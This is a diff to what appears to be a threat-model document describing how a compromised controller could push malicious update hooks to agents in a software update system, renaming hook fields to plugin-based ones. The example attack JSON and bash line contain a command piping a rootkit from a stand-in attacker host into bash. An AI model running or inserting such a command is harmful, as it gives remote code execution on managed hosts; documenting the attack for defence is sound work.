@@ -12,8 +12,8 @@
 1. The attacker compromises the controller through any means: direct access to the
    controller host, database access to modify settings, forged JWT with `owner`
    permissions (via [ATK-03](03-master-key-compromise.md)), or NATS message injection.
-2. The attacker crafts an `ExecuteUpdate` message with malicious `pre_update_hooks`
-   or `post_update_hooks`:
+2. The attacker crafts an `ExecuteUpdate` message with malicious
+   `pre_update_hook_plugins` or `post_update_hook_plugins`:
 
    ```json
    {
@@ -23,24 +23,23 @@
      "software_item_id": "<uuid>",
      "to_version": "1.0.0",
      "execute_update_plugin": { "plugin_type": "generic_shell", "config": {} },
-     "pre_update_hooks": [
+     "pre_update_hook_plugins": [
        {
-         "type": "shell",
-         "command": "curl attacker.com/rootkit | bash",
-         "shell": "bash"
+         "plugin_type": "hook_shell",
+         "config": { "pre_command": "curl attacker.com/rootkit | bash" }
        }
      ]
    }
    ```
 
 3. The controller sends this message to the target agent over the mTLS WebSocket.
-4. The agent's `run_hook_command()` executes the shell command via
+4. The agent instantiates the hook plugin and executes the shell command via
    `bash -c "set -euo pipefail\ncurl attacker.com/rootkit | bash"`.
 
 The same attack applies via:
 
-- **`ExecuteBatchUpdate`** — carries the same `pre_update_hooks` and
-  `post_update_hooks` fields.
+- **`ExecuteBatchUpdate`** — carries the same `pre_update_hook_plugins` and
+  `post_update_hook_plugins` fields.
 - **`CheckVersions`** — does not carry hooks directly, but the `PluginAssignment`
   config JSON is passed to the plugin constructor. A malicious config for the
   `generic_shell` plugin type contains `version_command` which is executed as a
@@ -169,8 +168,7 @@ The same attack applies via:
 - [ATK-03: Master Key Compromise](03-master-key-compromise.md)
 - [Security Architecture](../security/security-architecture.md)
 - `crates/shared/wire/src/payloads.rs` — `ExecuteUpdatePayload`
-- `crates/shared/wire/src/messages.rs` — `HookCommand`
-- `crates/shared/agent-core/src/update.rs` — `run_hook_command()`
+- `crates/shared/agent-core/src/update.rs` — update lifecycle hook execution
 - `crates/shared/command/src/command.rs` — `run_command_with_shell()`
 - `crates/core/agent/src/main.rs` — freeze file check, rate limiting, and `SetUpdateFreeze` handler
 - `crates/core/agent-ssh/src/main.rs` — freeze file check, per-host rate limiting, and `SetUpdateFreeze` handler
